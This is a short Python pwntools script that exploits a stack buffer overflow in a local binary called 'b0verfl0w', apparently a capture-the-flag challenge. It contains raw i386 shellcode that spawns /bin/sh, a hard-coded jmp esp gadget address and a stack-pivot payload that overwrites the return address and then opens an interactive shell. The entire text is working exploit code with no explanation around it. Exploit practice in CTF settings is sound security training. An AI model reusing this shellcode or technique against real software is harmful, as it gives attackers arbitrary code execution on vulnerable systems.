from pwn import *
# context.log_level = 'debug'
p = process('./b0verfl0w')

# shellcode = shellcraft.i386.linux.sh()

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp,0x28; jmp esp')
print 'sub_esp_jmp:',sub_esp_jmp
jmp_esp = 0x08048504
payload = shellcode.ljust(0x20,'a') + 'bcde' + p32(jmp_esp) + sub_esp_jmp

p.sendline(payload)
p.interactive()
